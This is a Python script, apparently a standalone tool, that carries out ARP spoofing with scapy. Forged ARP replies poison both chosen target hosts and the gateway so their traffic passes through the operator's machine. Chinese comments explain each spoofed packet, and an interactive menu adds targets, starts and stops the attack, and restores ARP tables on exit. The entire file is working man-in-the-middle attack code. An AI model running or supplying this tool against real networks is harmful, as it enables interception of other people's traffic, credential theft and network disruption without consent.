from scapy.all import *
import threading
import psutil


class ArpSpoof:
    def __init__(self, interface, gateway):
        self.interface = interface
        self.gateway = gateway
        self.gateWayMac = getmacbyip(gateway)
        self.srcMac = get_if_hwaddr(interface)
        self.targetsList = []
        self.stop_event = threading.Event()
        self.statFlag = False

    def add(self, tgtIP:str):
        self.targetsList.append([tgtIP, None])
    
    def delete(self, idx: int):
        idx = int(idx)
        try:
            t: threading.Thread = self.targetsList[idx][1]
            t.join()
        except Exception:
            pass
        self.targetsList.pop(idx)
    
    def list(self):
        if not len(self.targetsList):
            print("Empty List")
            return
        iter = 0
        for i in self.targetsList:
            print(f"{iter}: {i[0]}")
            iter += 1
    
    def start(self):
        self.statFlag = True
        self.stop_event.clear()
        # 持续发送ARP欺骗数据包
        for i in self.targetsList:
            t = threading.Thread(target=self.run, args=(i[0],))
            t.start()
    
    def status(self):
        return self.statFlag
    
    def stop(self):
        self.statFlag = False
        self.stop_event.set()

    def run(self, tgtIP):
        tgtMac = getmacbyip(tgtIP)
        print("\n[+] Target MAC: {} Target IP: {}".format(tgtMac, tgtIP))

        while not self.stop_event.is_set():
            self.sendPayload(tgtIP, tgtMac)
        self.restore(tgtIP, tgtMac)

    def sendPayload(self, tgtIP, tgtMac):
        # 生成并发送第一个ARP数据包，伪造网关的IP和MAC地址，欺骗目标计算机
        # 使目标计算机认为网关的MAC地址是攻击者的MAC地址
        sendp(
            Ether(src=self.srcMac, dst=tgtMac) /  # 以攻击者的MAC地址作为源MAC，目标计算机的MAC地址作为目的MAC
            ARP(hwsrc=self.srcMac, psrc=self.gateway, hwdst=tgtMac, pdst=tgtIP, op=2),  # ARP数据包，其中op=2表示ARP回复
            iface=self.interface, verbose=False
        )
        
        # 生成并发送第二个ARP数据包，伪造目标计算机的IP和MAC地址，欺骗网关
        # 使网关认为目标计算机的MAC地址是攻击者的MAC地址
        sendp(
            Ether(src=self.srcMac, dst=self.gateWayMac) /  # 以攻击者的MAC地址作为源MAC，网关的MAC地址作为目的MAC
            ARP(hwsrc=self.srcMac, psrc=tgtIP, hwdst=self.gateWayMac, pdst=self.gateway, op=2),
            iface=self.interface, verbose=False
        )
    
    def restore(self, tgtIP, tgtMac):
        print(f"\n[-] Restoring Target IP: {tgtIP} Target Mac: {tgtMac}")
        send(ARP(op=2, psrc=self.gateway, pdst=tgtIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.gateWayMac), count=5, verbose=False)
        send(ARP(op=2, psrc=tgtIP, pdst=self.gateway, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=tgtMac), count=5, verbose=False)


class ScanInterface:
    def __init__(self) -> None:
        # 获取所有网络接口及其信息
        self.interfaces = psutil.net_if_addrs()

        self.ifList: list = []
        for interface in self.interfaces.items():
            self.ifList.append(interface)

    def print(self):
        iter = 0
        for interface_name, interface_addresses in self.ifList:
            print(f"{iter}: Interface: {interface_name}")
            for address in interface_addresses:
                print(f"    Address: {address.address}, Family: {address.family} \n")
            iter += 1

    def get(self, idx: int):
        return self.ifList[idx][0]



if __name__ == "__main__":
    print("Welcome to ARPSpoof")
    print("Please choose your Interface")
    scanInterface = ScanInterface()
    scanInterface.print()
    while True:
        idx = int(input("Please input the index number.\n>>> "))
        try:
            ifName: str = scanInterface.get(idx)
            break
        except IndexError:
            print(f"Please input a number between 0~{len(scanInterface.ifList)-1}")
    gateway: str = input("Please input the gateway's IP.\n>>> ")
    arpSpoof = ArpSpoof(ifName, gateway)
    
    def printHelp():
        print("\nCommand List:")
        print("add [Target IP] : Add target IP")
        print("ls : List all Target IPs")
        print("del [Index in List] : Delete the Target IP")
        print("run : Start ARPSpoof")
        print("stop : Stop ARPSpoof")
        print("stat : Show ARPSpoof status")
        print("help : Show this text")
        print("exit : Stop ARPSpoof and exit")
        print("")
    printHelp()
    
    while True:
        opt = input(">>> ").split()
        if not len(opt):
            continue

        elif opt[0] == "add":
            if len(opt) != 2:
                print("Format: add [Target IP]")
                continue
            arpSpoof.add(opt[1])
            print(f"Target {opt[1]} added")
            
        elif opt[0] == "ls":
            arpSpoof.list()
        
        elif opt[0] == "del":
            if len(opt) != 2:
                print("Format: add [Index in list]")
                continue
            arpSpoof.delete(opt[1])
            print(f"Target {opt[1]} deleted")
        
        elif opt[0] == "run":
            arpSpoof.start()
            print("ArpSpoof Started")
        
        elif opt[0] == "stop":
            arpSpoof.stop()
            print("ArpSpoof Stopped")
        
        elif opt[0] == "help":
            printHelp()

        elif opt[0] == "stat":
            print("ARPSpoof is running" if arpSpoof.status() else "ARPSpoof not starts")
        
        elif opt[0] == "exit":
            arpSpoof.stop()
            print("Exit!")
            break
        
        else:
            print(f"{opt[0]} is not a command. Enter 'help' to get the command list")
